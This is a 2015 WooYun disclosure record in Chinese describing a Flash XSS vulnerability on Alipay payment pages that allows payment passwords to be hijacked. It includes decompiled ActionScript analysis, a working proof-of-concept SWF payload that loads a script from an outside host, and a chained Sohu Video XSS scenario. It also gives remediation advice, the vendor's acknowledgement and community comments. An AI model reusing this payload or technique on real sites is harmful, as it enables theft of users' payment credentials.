{"id": 46596, "wybug_id": "wooyun-2015-090187", "wybug_title": "利用某漏洞进行支付宝支付密码劫取", "wybug_corp": "阿里巴巴", "wybug_author": "gainover", "wybug_date": "2015-01-06 09:00", "wybug_open_date": "2015-02-20 09:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向公众公开  简要描述： 之前发过一个劫持登录密码的，这次发一个劫持支付密码的。支付宝一些需要使用支付密码的页面上存在安全缺陷，导致恶意攻击者可以通过构建恶意页面来劫持到受害者的支付密码。 详细说明：  1. 我们可以看到在支付宝的一些功能页面上，会调用以下FLASH文件：https://i.alipayobjects.com/e/201309/17IDNJfn8n.swf。比如这个页面：https://yebprod.alipay.com/yeb/purchase.htm，当然还有其他好多页面会调用，这里不一一列举了。\n\n2. 接着我们来分析分析这个FLASH文件。\n//Main.as         Trinity.embed(this);    //<-- 调用了 Trinity类的embed方法\nembed方法:\n//Trinity.as\t_local3 = 外部参数.group  <-- _group\t_local5:Engine =new Engine(_loca3) \t_local5.connect();\n接着看Engine类:\n//Engine.as \tfunction connect(){\t\tthis.kernel.connect(this.group);\t}\t\tthis.kernel = new Kernel(HANDER, this); <- this = Engine\n代码进入Kernel类\n//Kernel.as\tpublic function Kernel(_arg1:String, _arg2:IReceiver){\t\tthis.privateName = guid(\"_\");\t\tthis._sender = new Sender(_arg1);\t\tthis._receiverProxy = new ReceiverProxy(_arg2);  <-- _arg2 = Engine\t}\n调用了ReceiverProxy类\n//ReceiverProxy.as\tpublic function ReceiverProxy(_arg1:IReceiver){\t\tthis.localConn = new LocalConnection();\t\tsuper();\t\tthis.localConn.client = _arg1;  <-- _arg1 = Engine\t\tthis.localConn.allowDomain(\"*\");\t}\n-------------------------------------------------------------到了这里，可以看到，最终建立了一个LocalConnection，并且allowDomain(\"*\")，且LocalConnection的client属性指向了Engine。这意味着，我们可以自行编写一个FLASH，来远程调用 Engine 类的 所有 public 的方法。如果 Engine里所暴露出来的方法，存在安全缺陷，比如调用了ExternalInterface.call，且参数可控，那么必然形成安全问题。经过分析，我们发现，receive 方法满足这一点。\n\nreceive在一定条件下会进入调用以下代码。\ncallFunc(this.onReceived, _arg1);\n其中this.onReceived的定义可以在 Trinity 类的定义中看到。\n//Trinity.as        ...        public function Trinity(_arg1:Engine){            this._engine = _arg1;            instance = this;            _arg1.onConnected = this.onConnected;            _arg1.onMaster = this.onMaster;            _arg1.onSended = this.onStatus;            _arg1.onError = this.onStatus;            _arg1.onReceived = this.onReceived;   <-- here        }        ....        private function onReceived(_arg1):void{            AJBridgeLite.callJS({type:\"message\", data:_arg1});        }\n-------------------------------------------------------------因此，我们可以自行编写一个FLASH文件，即可远程调用支付宝的FLASH中Engine类的receive方法，从而在支付宝页面上执行XSS代码。于是，编写FLASH代码如下：\npackage {\timport flash.display.Sprite;\timport flash.events.StatusEvent;\timport flash.events.TimerEvent;\timport flash.net.LocalConnection;\timport flash.utils.Timer;\tpublic class LocalConn extends Sprite\t{\t\tprivate var lc:LocalConnection;\t\tpublic function LocalConn()\t\t{\t\t\tlc=new LocalConnection();\t\t\tlc.addEventListener(StatusEvent.STATUS,function(e:StatusEvent):void{\t\t\t\ttrace(e);\t\t\t});\t\t\t/*timer*/\t\t\tvar timer:Timer=new Timer(1000);\t\t\ttimer.addEventListener(TimerEvent.TIMER,senddata);\t\t\ttimer.start();\t\t}\t\tprivate function senddata(e:TimerEvent):void{\t\t\tlc.send(\"_group\",\"receive\",{\"type\":0,\"to\":\"_group\",'data':'aaaaa\\\\\",a:(function(){if(!window.__x){window.__x=1;var s=document.createElement(\\'script\\');s.src=\\'//xsst.sinaapp.com/poc/alipay.js?\\'+Math.random();document.body.appendChild(s);}})()})})))}catch(e){}function jsEntry(){}//aaaa'},\"_group\");\t\t}\t}}\n以上代码，会不停的向 _group send 命令， 一旦发现 _group 这个LocalConnection，就会调用其receive函数。FLASH文件已上传至：https://xsst.sinaapp.com/poc/LocalConn2.swf打开以上FLASH文件(注意，FLASH页面不能关闭)，然后再打开 https://yebprod.alipay.com/yeb/purchase.htm 页面（需登录），就会发现会弹出提示框“demo”。\n\n-------------------------------------------------------------这样一来，我们实际上可以在这些敏感的页面下执行任意JS代码，比如将密码控件替换为普通文本框（普通用户无法察觉），从而实现劫持密码。但上面的流程，显然存在一个局限性，就是需要一直打开https://xsst.sinaapp.com/poc/LocalConn2.swf 这一FLASH文件。咋一想，似乎有点鸡肋，实则不然。因为一般的支付流程， 用户先是停留在“电商”或其它“非支付页面”上，而后进入支付流程时，支付宝页面被打开，但“电商”或其它“非支付页面”依然处于打开状态。 因此，如果“电商”或其它“非支付页面”存在漏洞，使得我们可以向页面内嵌入https://xsst.sinaapp.com/poc/LocalConn2.swf，那么用户的支付密码被劫持的可能性大大增加，并且这类场景确实是十分常见的。下面我以“搜狐视频”作为这类场景的一个实例来进行说明，具体见“漏洞证明部分”。   漏洞证明：  1. 搜狐视频存在XSS漏洞，导致我们可以在搜狐视频的页面下执行XSS。我们首先通过 http://xsst.sinaapp.com/poc/alipay.poc.htm 向 搜狐视频植入恶意代码，从而嵌入https://xsst.sinaapp.com/poc/LocalConn.swf2. https://xsst.sinaapp.com/poc/LocalConn2.swf 这个FLASH，会不断的向 _group 这个LocalConnection发送请求。\nlc.send(\"_group\",\"receive\",{\"type\":0,\"to\":\"_group\",'data':'aaaaa\\\\\",a:(function(){if(!window.__x){window.__x=1;var s=document.createElement(\\'script\\');s.src=\\'//xsst.sinaapp.com/poc/alipay.js?\\'+Math.random();document.body.appendChild(s);}})()})})))}catch(e){}function jsEntry(){}//aaaa'},\"_group\");\n3. 最终搜狐视频用户，在充值进入支付宝支付页面时， 上一步骤里的XSS代码将被执行，支付页面里被注入//xsst.sinaapp.com/poc/alipay.js文件。4. //xsst.sinaapp.com/poc/alipay.js 为了做演示，将密码控件框替换成普通密码框，劫持用户密码。\n\n可以看到密码被劫持\n\n5. 当然好多个地方的页面，用到了支付密码的均受到了影响。\n\n-------------------------------------------------------------最后，我也录制了一个演示视频。http://v.youku.com/v_show/id_XODY1NDEzMjM2.html密码：wooyunalipay   修复方案：  1. localconnection本身也是一个存在安全隐患的点，尽量避免使用localconnection.allowDomain(\"*\")2. ExternalInterface.call 的参数如果是可控的，在进入前一定要过滤一下。 可以考虑在该FLASH的AJBridgeLite类里做统一处理。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-06 15:26 厂商回复： 感谢您对阿里巴巴安全的支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-06 15:40 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  支持二哥。    \n     2015-01-06 16:09 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  二哥终于出关了    \n     2015-01-06 16:10 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  ................................    \n     2015-01-06 23:22 |    \t\tAphxg \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  二哥威武 天下无敌，我想这个世界上再也没有人是二哥的对手了，三界五行之中无仙无佛可以阻拦二哥，祝二哥早日一统天下。吾皇万岁万岁 万万岁。    \n     2015-01-07 13:58 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  为什么关注的这么少。难道都是土豪，不怕支付密码被二哥弄走！    \n     2015-01-07 20:27 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  mark    \n     2015-01-13 13:18 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这个漏洞没有提醒关注？看来是先匿名发了，然后才取消匿名了，要么就是乌云bug了    \n     2015-01-23 16:24 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  二哥早已跳出三界外，不在五行中    \n     2015-02-04 20:51 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  厉害    \n     2015-02-07 15:51 |    \t\tlopo \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 不一样的烟火)\t\t \n  真牛掰~~膜拜大牛    \n     2015-02-07 18:11 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  屌屌的    \n     2015-02-07 18:56 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  跪着看完    \n     2015-02-07 23:21 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  屌，现在都开始研究flash xss了？    \n     2015-02-17 07:46 |    \t\tDavidoff \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 品牌创立人季诺·大卫杜夫（Zino Davidoff...)\t\t \n  大神出手就是不一样    \n     2015-02-20 09:31 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  思路很不错，学习了    \n     2015-02-20 10:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  完美    \n     2015-02-20 14:45 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  技术精湛老道    \n     2015-03-03 10:41 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  跪着看完+1    \n     2015-07-22 15:02 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  跪着看完+1    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}